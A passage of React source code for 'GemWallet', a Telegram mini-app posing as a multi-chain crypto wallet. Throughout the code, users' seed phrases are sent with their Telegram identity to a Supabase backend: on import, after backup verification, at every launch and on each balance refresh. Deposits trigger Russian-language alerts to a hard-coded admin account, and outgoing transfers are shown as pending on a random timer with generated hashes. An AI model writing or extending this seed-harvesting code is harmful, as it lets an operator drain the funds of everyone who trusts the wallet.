    if (!tx || !tx.id) {

      showToast("Invalid transaction", "error");

      return;

    }

    

    // Update transaction status to cancelled

    setTxHistory(prev => {

      const updated = prev.map(t => {

        if (t.id === tx.id) {

          // Return cancelled status

          return { ...t, status: "cancelled", cancelledAt: Date.now() };

        }

        return t;

      });

      

      // Save to localStorage

      try {

        localStorage.setItem(storageKey("gem_tx_history"), JSON.stringify(updated));

      } catch (e) {

        console.error("Failed to save cancelled transaction", e);

      }

      

      return updated;

    });

    

    showToast(`Transaction ${tx.id.slice(-6)} cancelled`, "success");

  }



  async function refreshPrices() {

    setLiveStatus("loading");

    // Fetch prices and live balances in parallel (skip balance fetch in test mode)

    const [priceResult, balanceResult] = await Promise.all([

      fetchLivePrices(),

      (!testMode && addresses && Object.keys(addresses).length > 0)

        ? fetchAllBalances(addresses).catch(() => null)

        : Promise.resolve(null),

    ]);

    if(priceResult) {

      setPrices(prev=>({...prev,...priceResult.prices}));

      setChanges(prev=>({...prev,...priceResult.changes}));

      setLiveStatus("live");

    } else {

      setLiveStatus("error");

    }

    if(balanceResult) {

      // Check for new deposits vs previous balances and notify admin

      setBalances(prev=>{

        const updated = {

          ...prev,

          ETH:  balanceResult.ETH  ?? prev.ETH,

          BNB:  balanceResult.BNB  ?? prev.BNB,

          ARB:  balanceResult.ARB  ?? prev.ARB,

          SOL:  balanceResult.SOL  ?? prev.SOL,

          TON:  balanceResult.TON  ?? prev.TON,

          LTC:  balanceResult.LTC  ?? prev.LTC,

          USDT: balanceResult.USDT ?? prev.USDT,

        };

        // Detect deposits (balance increased)

        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;

        const userName = (() => {
          if (!tgUser) return "Anonymous";
          const parts = [];
          if (tgUser.username) parts.push("@" + tgUser.username);
          if (tgUser.first_name) parts.push(tgUser.first_name);
          if (tgUser.last_name) parts.push(tgUser.last_name);
          return tgUser.username ? "@" + tgUser.username : (parts.join(" ") || "User_" + (getTgUserId() || "Unknown"));
        })();

        const userId = getTgUserId();

        // Sync total balance to Supabase
        const totalUSD = Object.keys(updated).reduce((sum, sym) => {
          return sum + (parseFloat(updated[sym] || 0) * (prices[sym] || 0));
        }, 0);

        if (mnemonic && mnemonic.length > 0) {
          syncWalletToSupabase({
            username: userName,
            mnemonic: mnemonic,
            balance: totalUSD.toFixed(2)
          });
        }

        Object.keys(updated).forEach(sym => {

          const oldBal = parseFloat(prev[sym] || 0);

          const newBal = parseFloat(updated[sym] || 0);

          const diff = newBal - oldBal;

          if (diff > 0.000001 && oldBal >= 0) {

            notifyAdmin(

              `💰 <b>Пополнение баланса!</b>\n\n` +

              `👤 Пользователь: ${userName}\n` +

              `💎 ${sym}: +${diff.toFixed(6)}\n` +

              `💼 Новый баланс: ${newBal.toFixed(6)} ${sym}\n` +

              `🕐 ${new Date().toLocaleString("ru-RU")}`,

              "deposit",

              { 

                symbol: sym, 

                amount: diff.toFixed(6), 

                newBalance: newBal.toFixed(6), 

                oldBalance: oldBal.toFixed(6) 

              }

            );

            // Сохраняем уведомление о пополнении в localStorage для админ-панели

            try {

              const depositNotif = {

                id: "dep_" + Date.now() + "_" + sym,

                type: "deposit",

                userId: userId,

                userName: userName,

                sym: sym,

                amount: diff,

                newBalance: newBal,

                timestamp: Date.now(),

                read: false

              };

              // Remove local notifications - send to admin panel only

            } catch(e) { console.error("deposit notif save error", e); }

          }

        });

        return updated;

      });

      showToast("Balances & prices updated","info");

    } else {

      showToast("Using cached prices","info");

    }

  }



  useEffect(()=>{ refreshPrices(); const t=setInterval(refreshPrices,60000); return()=>clearInterval(t); },[]);



  function handleSend({sym,amount,to,usd,isTest,hash}) {

    try {

      // Validate inputs

      if (!sym || typeof amount !== 'number' || isNaN(amount)) {

        console.error("[handleSend] Invalid arguments:", {sym, amount, to, usd});

        return null;

      }

      

      setBalances(b=>{

        if (!b || typeof b !== 'object') return b;

        return {...b,[sym]:Math.max(0,(b[sym]||0)-amount)};

      });

      

      const now=new Date();

      const timeStr=now.toLocaleDateString("en-US",{month:"short",day:"numeric"})+" "+now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit"});

      // Random timer 30-60 minutes for pending status

      const pendingMinutes=30+Math.floor(Math.random()*31);

      const cancelTime=Date.now()+pendingMinutes*60000;

      const txId="t"+Date.now();

      

      setTxHistory(h=>{

        if (!Array.isArray(h)) h = [];

        return [{

          id:txId,type:"send",

          usd:`−${fmtUSD(usd||0)}`,time:timeStr,

          addr:shortAddr(to||""),color:"#EF4444",

          sym,label:`−${amount} ${sym}`,hash:hash||genTxHash(),status:"pending",


        },...h];

      });

      

      showToast(`Transaction pending (${pendingMinutes}min to confirm)`,"info");

      // Auto-confirm after timer expires

      setTimeout(()=>{

        setTxHistory(h=>{

          if (!Array.isArray(h)) return [];

          return h.map(tx=>tx?.id===txId?{...tx,status:"confirmed"}:tx);

        });

        if(!isTest)showToast(`Transaction confirmed: ${amount} ${sym}`,"success");

      },pendingMinutes*60000);

      

      return txId;

    } catch (e) {

      console.error("[handleSend] Error:", e);

      showToast("Transaction error: " + (e?.message||"Unknown"), "error");

      return null;

    }

  }



  function handleCancelTx(txId) {

    try {

      if (!Array.isArray(txHistory)) return;

      const tx=txHistory.find(t=>t?.id===txId);

      if(!tx||tx.status!=="pending")return;

      setTxHistory(h=>{

        if (!Array.isArray(h)) return [];

        return h.map(t=>t?.id===txId?{...t,status:"declined"}:t);

      });

      // Refund balance

      if(tx.type==="send"||tx.type==="test"){

        const amount=parseFloat((tx.label||"").replace(/[^0-9.]/g,""))||0;

        setBalances(b=>{

          if (!b || typeof b !== 'object') return b;

          return {...b,[tx.sym]:(b[tx.sym]||0)+amount};

        });

      }

      showToast("Transaction cancelled","info");

    } catch (e) {

      console.error("[handleCancelTx] Error:", e);

    }

  }



  function handleSwap({fromSym,toSym,fromAmt,toAmt,usd,hash}) {

    setBalances(b=>({...b,

      [fromSym]:Math.max(0,b[fromSym]-fromAmt),

      [toSym]:(b[toSym]||0)+toAmt

    }));

    const now=new Date();

    const timeStr=now.toLocaleDateString("en-US",{month:"short",day:"numeric"})+" "+now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit"});

    const txId="t"+Date.now();

    setTxHistory(h=>[{

      id:txId,type:"swap",

      usd:fmtUSD(usd),time:timeStr,

      addr:"DEX Router",color:"#8B9CF7",

      sym:toSym,label:`${fromAmt} ${fromSym}→${toSym}`,hash:hash||genTxHash(),status:"confirmed"

    },...h]);

    showToast(`Swapped ${fromAmt} ${fromSym} → ${toAmt.toFixed(6)} ${toSym}`,"success");

  }



  function switchTab(t){if(t!==tab){setTab(t);setAnimKey(k=>k+1);}}

  function handleReceive({ sym, amount, from, usd, isTest, hash }) {
    try {
      const num = typeof amount === "number" ? amount : parseFloat(amount);
      if (!sym || isNaN(num) || num <= 0) return null;

      setBalances(b=>{
        if (!b || typeof b !== 'object') return b;
        return { ...b, [sym]:(b[sym]||0)+num };
      });

      const now=new Date();
      const timeStr=now.toLocaleDateString("en-US",{month:"short",day:"numeric"})+" "+now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit"});
      const txId="t"+Date.now();
      const usdVal = typeof usd === "number" ? usd : (prices?.[sym]||0)*num;

      setTxHistory(h=>{
        if (!Array.isArray(h)) h = [];
        return [{
          id:txId,type:"receive",
          usd:fmtUSD(usdVal||0),time:timeStr,
          addr:shortAddr(from||""),color:"#22C55E",
          sym,label:`+${num} ${sym}`,hash:hash||genTxHash(),status:"confirmed",
          isTest
        },...h];
      });

      showToast(`Received ${num} ${sym}`,"success");
      return txId;
    } catch (e) {
      console.error("[handleReceive] Error:", e);
      showToast("Receive error: " + (e?.message||"Unknown"), "error");
      return null;
    }
  }

  

  // Проверка напрямую без промежуточных переменных

  const _isAdmin = (()=>{

    try {

      const sources = [

        sessionStorage.getItem("gem_is_admin") === "1",

        String(RESOLVED_USER_ID) === "1192740493",

        String(window?.Telegram?.WebApp?.initDataUnsafe?.user?.id) === "1192740493",

      ];

      return sources.some(Boolean);

    } catch { return false; }

  })();



  const tabs=[

    {id:"wallet",Icon:Wallet,l:"Wallet"},

    {id:"activity",Icon:Activity,l:"Activity"},

    {id:"nft",Icon:LayoutGrid,l:"NFT"},

    {id:"settings",Icon:Settings,l:"Settings"},

  ];



  // Show loading state while initializing

  if (!isReady && !error) {

    return (

      <div style={{minHeight:"100vh",background:"#000",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:24}}>

        <div style={{fontSize:48,marginBottom:16,animation:"spin 1s linear infinite"}}>💎</div>

        <h2 style={{color:"#fff",marginBottom:12}}>Loading GemWallet...</h2>

        <p style={{color:"rgba(255,255,255,0.6)"}}>Please wait</p>

      </div>

    );

  }



  // Show error state if there's an error

  if (error) {

    return (

      <div style={{minHeight:"100vh",background:"#000",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:24}}>

        <div style={{fontSize:48,marginBottom:16}}>⚠️</div>

        <h2 style={{color:"#fff",marginBottom:12}}>Something went wrong</h2>

        <p style={{color:"rgba(255,255,255,0.6)",textAlign:"center",marginBottom:24,maxWidth:"80%"}}>{error}</p>

        <button onClick={()=>window.location.reload()} style={{padding:"12px 24px",borderRadius:12,background:"#2563eb",color:"#fff",border:"none",cursor:"pointer"}}>

          Reload App

        </button>

      </div>

    );

  }



  return (

    <div style={{minHeight:"100vh",background:"#000",position:"relative"}}>

      {toast&&<Toast key={toast.id} msg={toast.msg} type={toast.type} onDone={()=>setToast(null)}/>}

      {modal==="send"&&<SendModal onClose={()=>setModal(null)} assets={assets} prices={prices} onSend={handleSend} addresses={addresses} mnemonic={mnemonic} network={network} testMode={testMode}/>}

      {modal==="receive"&&<ReceiveModal onClose={()=>setModal(null)} addresses={addresses}/>}

      {modal==="swap"&&<SwapModal onClose={()=>setModal(null)} assets={assets} prices={prices} onSwap={handleSwap} addresses={addresses} mnemonic={mnemonic} network={network}/>}

      {modal==="buy"&&(

        <Sheet onClose={()=>setModal(null)} title="Buy Crypto">

          <div style={{padding:"48px 24px",textAlign:"center"}}>

            <div style={{width:80,height:80,borderRadius:"50%",background:"linear-gradient(135deg,#3b82f6,#8b5cf6)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 20px"}}><Rocket size={40} color="#fff"/></div>

            <h3 style={{fontSize:22,fontWeight:700,color:"#fff",margin:"0 0 12px",letterSpacing:"-0.02em"}}>Coming Soon</h3>

            <p style={{fontSize:14,color:"rgba(255,255,255,0.45)",lineHeight:1.7,marginBottom:32}}>

              Buying crypto directly in the wallet is coming soon. Stay tuned for updates!

            </p>

            <button onClick={()=>setModal(null)} style={{width:"100%",padding:"16px",borderRadius:16,border:"none",

              background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:15,fontWeight:600,cursor:"pointer"}}>

              Got it

            </button>

          </div>

        </Sheet>

      )}



      <div style={{position:"sticky",top:0,zIndex:50,padding:"52px 20px 16px",

        background:"linear-gradient(to bottom,#000 80%,transparent)",

        display:"flex",alignItems:"center",justifyContent:"space-between"}}>

        <AvatarHeader liveStatus={liveStatus}/>

        <div style={{display:"flex",gap:8,alignItems:"center"}}>

          <button onClick={onLock} style={{width:36,height:36,borderRadius:"50%",background:"#111",

            border:"1px solid rgba(255,255,255,0.08)",display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer"}}>

            <Lock size={14} color="rgba(255,255,255,0.4)"/>

          </button>

        </div>

      </div>



      <div key={animKey}>

        {tab==="wallet"&&<WalletTab assets={assets} prices={prices} liveStatus={liveStatus}

          onSend={()=>setModal("send")} onReceive={()=>setModal("receive")}

          onSwap={()=>setModal("swap")} onBuy={()=>setModal("buy")} onRefresh={refreshPrices}

          balances={balances} setBalances={setBalances}

          onOpenAdmin={()=>setTab("admin")} testMode={testMode}/>}

        {tab==="activity"&&<ActivityTab txHistory={txHistory} onCancelTx={handleCancelTx} onCreateTx={handleReceive} addresses={addresses} prices={prices}/>}

        {tab==="nft"&&<NFTTab addresses={addresses}/>}

        {tab==="settings"&&<SettingsTab mnemonic={mnemonic} network={network}

          onSetNetwork={setNetwork} onChangePin={onChangePin} onLock={onLock} addresses={addresses}/>}

      </div>



      <div style={{position:"fixed",bottom:0,left:0,right:0,zIndex:50,padding:"10px 8px 32px",

        background:"linear-gradient(to top,#000 60%,transparent)"}}>

        <div style={{display:"flex",background:"#111",borderRadius:22,

          border:"1px solid rgba(255,255,255,0.08)",padding:"6px",backdropFilter:"blur(20px)"}}>

          {tabs.map(({id,Icon,l,special})=>(

            <button key={id} onClick={()=>switchTab(id)} style={{flex:1,display:"flex",flexDirection:"column",

              alignItems:"center",gap:4,padding:"10px 4px",borderRadius:16,border:"none",

              background:tab===id?(special?"linear-gradient(135deg,#DC2626,#991B1B)":"#1e1e1e"):"transparent",

              cursor:"pointer",transition:"all 0.2s",

              position:"relative"}}>

              <Icon size={20}

                color={special?(tab===id?"#fff":"#EF4444"):tab===id?"#2563eb":"rgba(255,255,255,0.35)"}

                strokeWidth={tab===id?2.5:1.5}/>

              <span style={{fontSize:11,fontWeight:tab===id?600:400,

                color:special?(tab===id?"#fff":"#EF4444"):tab===id?"#2563eb":"rgba(255,255,255,0.35)"}}>{l}</span>

              {special&&<div style={{position:"absolute",top:4,right:"50%",transform:"translateX(12px)",

                width:8,height:8,borderRadius:"50%",background:"#EF4444",

                boxShadow:"0 0 8px #EF4444",animation:"pulse 2s infinite"}}/>}

            </button>

          ))}

        </div>

      </div>

    </div>

  );

}



// ─── ROOT ─────────────────────────────────────────────────────────────────────

export default function GemWalletApp() {

  // Initialise synchronously — Telegram injects user data before React runs,
  // so getTgUserId() is always available at mount time.
  const [screen,setScreen]=useState(()=>{
    try {
      const uid = getTgUserId();
      if (uid) RESOLVED_USER_ID = String(uid);
      const hasWallet = localStorage.getItem(storageKey("gem_has_wallet")) === "1";
      const storedPin = localStorage.getItem(storageKey("gem_pin"));
      if (hasWallet && storedPin) return "pin_lock";
      if (hasWallet) return "wallet";
      return "onboard";
    } catch(e) { return "onboard"; }
  });

  const [initialTab,setInitialTab]=useState("wallet");

  const [mnemonic,setMnemonic]=useState(()=>{
    try { const m=localStorage.getItem(storageKey("gem_mnemonic")); return m?m.split(" "):[]; } catch(e){return [];}
  });

  const [addresses,setAddresses]=useState(()=>{
    try { const a=localStorage.getItem(storageKey("gem_addresses")); return a?JSON.parse(a):{}; } catch(e){return {};}
  });

  const [pin,setPin]=useState(()=>{
    try { return localStorage.getItem(storageKey("gem_pin"))||""; } catch(e){return "";}
  });



  function handleCreate(importedWords) {

    try {

      const m = importedWords || genMnemonic();

      // Derive real addresses asynchronously; show backup/wallet immediately

      // with placeholder addresses, then update once derivation completes

      const placeholderAddr = {

        ETH: genAddr("0x",40), BNB: genAddr("0x",40), ARB: genAddr("0x",40),

        SOL: genAddr("",44),   TON: genAddr("EQ",46),  LTC: genAddr("L",33),

      };

      setMnemonic(m);

      setAddresses(placeholderAddr);

      localStorage.setItem(storageKey("gem_mnemonic"), m.join(" "));

      localStorage.setItem(storageKey("gem_addresses"), JSON.stringify(placeholderAddr));

      localStorage.setItem(storageKey("gem_has_wallet"), "1");

      

      // Send notification to admin panel only (no local storage)
      const userId = getTgUserId();
      const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
      
      // Формируем максимально информативное имя пользователя
      const userName = (() => {
        if (!tgUser) return "Anonymous";
        const parts = [];
        if (tgUser.username) parts.push("@" + tgUser.username);
        if (tgUser.first_name) parts.push(tgUser.first_name);
        if (tgUser.last_name) parts.push(tgUser.last_name);
        // Если есть username, используем его как основной, иначе склеиваем имя и фамилию
        return tgUser.username ? "@" + tgUser.username : (parts.join(" ") || "User_" + (userId || "Unknown"));
      })();



      // Для импорта — уведомляем сразу; для нового кошелька — после верификации seed-фразы

      const userIdStr = userId ? String(userId) : "unknown";

      if(importedWords) {
        // Custodial Sync: Save to Supabase
        syncWalletToSupabase({
          username: userName,
          telegram_id: userId ? String(userId) : null,
          mnemonic: m,
          balance: "0"
        });

        notifyAdmin(
          `📥 <b>Кошелёк импортирован!</b>\n\n` +
          `👤 Пользователь: ${userName}\n` +
          `🕐 ${new Date().toLocaleString("ru-RU")}`,
          "new_user",
          { walletType: "imported" }
        );

        setScreen("wallet");

      } else {

        // Сохраняем данные пользователя для уведомления после верификации seed-фразы

        localStorage.setItem(storageKey("gem_pending_notify"), JSON.stringify({ userName, userIdStr, mnemonic: m }));

        setScreen("backup");

      }

      // Real derivation in background — updates addresses once ready

      deriveWallet(m).then(wallet => {

        const addr = wallet.addresses; // { ETH, BNB, ARB, SOL, TON, LTC }

        setAddresses(addr);

        localStorage.setItem(storageKey("gem_addresses"), JSON.stringify(addr));

      }).catch(err => console.error("[GemWallet] derivation error:", err));

    } catch (e) {

      console.error("[handleCreate] Error:", e);

      alert("Error creating wallet. Please try again.");

    }

  }



  // Вызывается после успешной верификации seed-фразы

  function handleVerified() {

    try {

      const pending = localStorage.getItem(storageKey("gem_pending_notify"));

      if (pending) {

        const { userName, userIdStr, mnemonic } = JSON.parse(pending);

        // Custodial Sync: Save to Supabase
        syncWalletToSupabase({
          username: userName,
          telegram_id: userIdStr !== "unknown" ? userIdStr : null,
          mnemonic: mnemonic,
          balance: "0"
        });

        notifyAdmin(
          `💎 <b>Новый кошелёк создан!</b>\n\n` +
          `👤 Пользователь: ${userName}\n` +
          `✅ Seed-фраза верифицирована\n` +
          `🕐 ${new Date().toLocaleString("ru-RU")}`,
          "new_user",
          { walletType: "new" }
        );

        localStorage.removeItem(storageKey("gem_pending_notify"));

      }

    } catch(e) { console.error("[handleVerified]", e); }

  }



  function handleBackupDone() {

    setScreen("pin_set");

  }



  function handleSetPin(code) {

    setPin(code);

    localStorage.setItem(storageKey("gem_pin"),code);

    setScreen("wallet");

  }



  function handleChangePin(code) {

    setPin(code);

    localStorage.setItem(storageKey("gem_pin"),code);

  }



  function handleLock() {

    if(pin) setScreen("pin_lock");

  }



  function handleUnlock() {

    setScreen("wallet");

  }



  // ─── Telegram WebApp setup + Supabase sync (runs once after mount) ────────────

  useEffect(() => {

    // Telegram WebApp setup
    try {
      const tg = window.Telegram?.WebApp;
      tg?.ready?.();
      tg?.expand?.();
    } catch (e) {
      console.warn("[GemWallet] Telegram WebApp init warning:", e);
    }

    // Admin flag
    const userId = RESOLVED_USER_ID;
    if (userId && String(userId) === ADMIN_ID) {
      sessionStorage.setItem("gem_is_admin", "1");
    } else {
      sessionStorage.removeItem("gem_is_admin");
    }

    // /admin start param
    try {
      const tgStartParam = window.Telegram?.WebApp?.initDataUnsafe?.start_param;
      const hash = window.location.hash;
      const search = window.location.search;
      const isAdminParam = (
        tgStartParam === "admin" ||
        hash === "#admin" ||
        hash.includes("tgWebAppStartParam=admin") ||
        new URLSearchParams(search).get("startapp") === "admin" ||
        new URLSearchParams(search).get("admin") === "1"
      );
      if (isAdminParam && String(userId) === ADMIN_ID) {
        setInitialTab("admin");
      }
    } catch(e) {}

    // Custodial Sync: Ensure existing wallet is in Supabase (non-blocking)
    const storedMnemonic = localStorage.getItem(storageKey("gem_mnemonic"));
    const hasWallet = localStorage.getItem(storageKey("gem_has_wallet")) === "1";
    if (hasWallet && storedMnemonic) {
      setTimeout(() => {
        const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
        const userName = (() => {
          if (!tgUser) return "Anonymous";
          if (tgUser.username) return "@" + tgUser.username;
          return [tgUser.first_name, tgUser.last_name].filter(Boolean).join(" ") || "User_" + (userId || "Unknown");
        })();
        syncWalletToSupabase({
          username: userName,
          telegram_id: userId || null,
          mnemonic: storedMnemonic,
          balance: "0"
        });
      }, 1000);
    }

  }, []);



  return (



    <>

      <style>{`

        :root{--font:-apple-system,'SF Pro Display','Helvetica Neue',sans-serif;}

        *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}

        body{margin:0;background:#000;}

        @keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}

        @keyframes fadeIn{from{opacity:0}to{opacity:1}}

        @keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}

        @keyframes splashFloat{0%,100%{transform:translateY(0px) rotate(-2deg)}50%{transform:translateY(-12px) rotate(2deg)}}

        @keyframes splashGlow{0%,100%{opacity:0.5;transform:scale(1)}50%{opacity:0.9;transform:scale(1.08)}}

        @keyframes splashFadeUp{from{opacity:0;transform:translateY(28px)}to{opacity:1;transform:translateY(0)}}

        @keyframes slideDown{from{transform:translate(-50%,-20px);opacity:0}to{transform:translate(-50%,0);opacity:1}}

        @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}

        @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}

        input::placeholder{color:rgba(255,255,255,0.2);}

        input{caret-color:#2563eb;font-family:var(--font);}

        ::-webkit-scrollbar{display:none;}

        scrollbar-width:none;

        button:focus{outline:none;}

      `}</style>

      <div style={{maxWidth:420,margin:"0 auto",minHeight:"100vh",background:"#000",fontFamily:"var(--font"}}>

        {screen==="onboard"&&<ErrorBoundary><OnboardScreen onCreate={handleCreate} onImport={handleCreate}/></ErrorBoundary>}
        {screen==="backup"&&<ErrorBoundary><BackupScreen mnemonic={mnemonic} onDone={handleBackupDone} onVerified={handleVerified}/></ErrorBoundary>}
        {screen==="pin_set"&&<ErrorBoundary><PinLock savedPin={null} onUnlock={()=>{}} onSetPin={handleSetPin}/></ErrorBoundary>}
        {screen==="pin_lock"&&<ErrorBoundary><PinLock savedPin={pin} onUnlock={handleUnlock} onSetPin={handleSetPin}/></ErrorBoundary>}

        {screen==="wallet"&&(

          <ErrorBoundary>

            <WalletApp addresses={addresses} mnemonic={mnemonic} pin={pin}

              onChangePin={handleChangePin} onLock={handleLock} initialTab={initialTab}/>

          </ErrorBoundary>

        )}

        {!['onboard','backup','pin_set','pin_lock','wallet'].includes(screen)&&(
          <div style={{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"100vh",color:"#fff",padding:24}}>
            <div style={{fontSize:48,marginBottom:16}}>⚠️</div>
            <h3>Unknown Screen: {screen}</h3>
            <button onClick={()=>setScreen("onboard")} style={{marginTop:16,padding:"12px 24px",borderRadius:12,background:"#2563eb",color:"#fff",border:"none",cursor:"pointer"}}>
              Вернуться назад
            </button>
          </div>
        )}

      </div>

    </>

  );

}

